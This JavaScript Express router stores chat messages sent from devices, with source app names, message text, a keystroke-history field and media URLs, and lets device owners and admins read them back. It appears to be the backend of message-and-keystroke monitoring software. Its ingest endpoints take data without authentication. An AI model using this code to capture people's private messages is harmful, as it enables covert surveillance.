const express = require('express');
const router = express.Router();
const { getDb } = require('../database/mongodb');
const websocketService = require('../services/websocketService');
const { authenticate, optionalAuth } = require('../middleware/auth');
const fileLogger = require('../utils/logger');

// POST /api/chats - Single chat
router.post('/', async (req, res) => {
    try {
        const chat = req.body;
        
        // Log chat payload to file
        fileLogger.logChat(chat);
        
        // Validate required fields
        if (!chat.id || !chat.appPackage || !chat.appName || !chat.text) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields'
            });
        }
        
        const db = getDb();
        const chatDoc = {
            id: chat.id,
            deviceId: chat.deviceId || null,
            appPackage: chat.appPackage,
            appName: chat.appName,
            chatIdentifier: chat.chatIdentifier || null,
            text: chat.text,
            keyHistory: chat.keyHistory || null,
            mediaUrls: chat.mediaUrls || null,
            timestamp: chat.timestamp || Date.now(),
            synced: true, // Mark as synced
            syncAttempts: 0,
            lastSyncAttempt: null,
            errorMessage: null,
            createdAt: Math.floor(Date.now() / 1000)
        };
        
        // Use replaceOne with upsert for INSERT OR REPLACE behavior
        await db.collection('chats').replaceOne(
            { id: chat.id },
            chatDoc,
            { upsert: true }
        );
        
        // Broadcast WebSocket update
        if (chat.deviceId) {
            websocketService.broadcastDataUpdate(chat.deviceId, 'chat', chat);
        }
        
        res.json({
            success: true,
            message: 'Chat saved successfully'
        });
    } catch (error) {
        console.error('Error saving chat:', error);
        res.status(500).json({
            success: false,
            message: 'Error saving chat'
        });
    }
});

// POST /api/chats/batch - Batch chats
router.post('/batch', async (req, res) => {
    try {
        const chats = req.body;
        
        // Log batch chat payloads to file
        chats.forEach(chat => {
            fileLogger.logChat(chat);
        });
        
        if (!Array.isArray(chats) || chats.length === 0) {
            return res.status(400).json({
                success: false,
                message: 'Invalid batch data'
            });
        }
        
        const db = getDb();
        const operations = chats.map(chat => ({
            replaceOne: {
                filter: { id: chat.id },
                replacement: {
                    id: chat.id,
                    deviceId: chat.deviceId || null,
                    appPackage: chat.appPackage,
                    appName: chat.appName,
                    chatIdentifier: chat.chatIdentifier || null,
                    text: chat.text,
                    keyHistory: chat.keyHistory || null,
                    mediaUrls: chat.mediaUrls || null,
                    timestamp: chat.timestamp || Date.now(),
                    synced: true,
                    syncAttempts: 0,
                    lastSyncAttempt: null,
                    errorMessage: null,
                    createdAt: Math.floor(Date.now() / 1000)
                },
                upsert: true
            }
        }));
        
        await db.collection('chats').bulkWrite(operations);
        
        // Broadcast WebSocket updates for each chat
        chats.forEach(chat => {
            if (chat.deviceId) {
                websocketService.broadcastDataUpdate(chat.deviceId, 'chat', chat);
            }
        });
        
        res.json({
            success: true,
            message: `Saved ${chats.length} chats`
        });
    } catch (error) {
        console.error('Error saving batch:', error);
        res.status(500).json({
            success: false,
            message: 'Error saving batch'
        });
    }
});

// GET /api/chats - Get chats (with device filtering)
router.get('/', authenticate, async (req, res) => {
    try {
        const user = req.user || {};
        const role = user.role;
        const assignedDeviceId = user.deviceId;
        const deviceId = req.query.deviceId;
        
        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 50;
        const skip = (page - 1) * limit;
        
        const db = getDb();
        const filter = {};
        
        // Device owners can only see chats from their assigned device
        if (role === 'device_owner' && assignedDeviceId) {
            filter.deviceId = assignedDeviceId;
        } else if (role === 'admin') {
            // Admin can filter by deviceId if provided, otherwise see all
            if (deviceId) {
                filter.deviceId = deviceId;
            }
        } else {
            // Non-admin, non-device-owner users cannot access chats
            return res.status(403).json({
                success: false,
                message: 'Access denied'
            });
        }
        
        const chats = await db.collection('chats')
            .find(filter)
            .sort({ timestamp: -1 })
            .limit(limit)
            .skip(skip)
            .toArray();
        
        // Convert synced to boolean (handle both boolean and number formats)
        const formattedChats = chats.map(chat => ({
            ...chat,
            synced: chat.synced === true || chat.synced === 1
        }));
        
        res.json({
            success: true,
            data: formattedChats
        });
    } catch (error) {
        console.error('Error fetching chats:', error);
        res.status(500).json({
            success: false,
            message: 'Error fetching chats'
        });
    }
});

module.exports = router;
